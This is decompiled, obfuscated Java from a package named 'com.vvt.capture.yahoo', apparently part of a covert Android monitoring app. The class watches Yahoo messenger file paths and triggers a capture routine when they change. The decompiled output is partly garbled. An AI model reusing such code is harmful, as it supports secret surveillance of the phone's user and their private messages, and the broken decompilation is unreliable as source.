package com.vvt.capture.yahoo.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;

public class a
  implements e, com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private i c;
  private com.vvt.capture.yahoo.a d;
  private com.vvt.n.a.b e;
  private boolean f;
  private String g;
  private com.vvt.base.b h;
  
  public a(com.vvt.n.a.b paramb, com.vvt.capture.yahoo.a parama, String paramString, com.vvt.base.b paramb1)
  {
    this.e = paramb;
    this.d = parama;
    this.g = paramString;
    this.f = false;
    this.h = paramb1;
  }
  
  public void a(i parami)
  {
    int i = a;
    if (i != 0) {}
    i = this.f;
    if (i == 0)
    {
      i = 1;
      this.f = i;
      this.c = parami;
      com.vvt.n.a.b localb1 = this.e;
      if (localb1 != null)
      {
        String[] arrayOfString = com.vvt.capture.yahoo.c.a();
        int k = arrayOfString.length;
        i = 0;
        localb1 = null;
        while (i < k)
        {
          String str = arrayOfString[i];
          com.vvt.n.a.b localb2 = this.e;
          localb2.a(str, this);
          int j;
          i += 1;
        }
      }
      bool = b;
      if (!bool) {}
    }
    boolean bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = c.a();
    if (localObject != null)
    {
      String str1 = c.a(this.g);
      String str2 = this.g;
      String str3 = this.h.f();
      localObject = c.a((String)localObject, str1, str2, str3);
      boolean bool2 = com.vvt.ag.b.a((String)localObject);
      if (!bool2)
      {
        bool1 = com.vvt.capture.yahoo.c.a((String)localObject);
        if (!bool1) {
          break label108;
        }
        localObject = this.d;
        if (localObject == null) {
          break label108;
        }
        bool1 = a;
        if (bool1) {}
        localObject = this.d;
        ((com.vvt.capture.yahoo.a)localObject).a();
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label108:
      bool1 = a;
      if (bool1) {}
      localObject = this.c;
      ((i)localObject).a();
    }
  }
  
  public void b()
  {
    int i = 0;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = this.f;
    if (bool2)
    {
      this.f = false;
      bool2 = false;
      this.c = null;
      Object localObject = this.e;
      if (localObject != null)
      {
        localObject = com.vvt.capture.yahoo.c.a();
        int j = localObject.length;
        while (i < j)
        {
          String str = localObject[i];
          com.vvt.n.a.b localb = this.e;
          localb.a(str);
          i += 1;
        }
      }
    }
    boolean bool1 = a;
    if (bool1) {}
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/yahoo/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */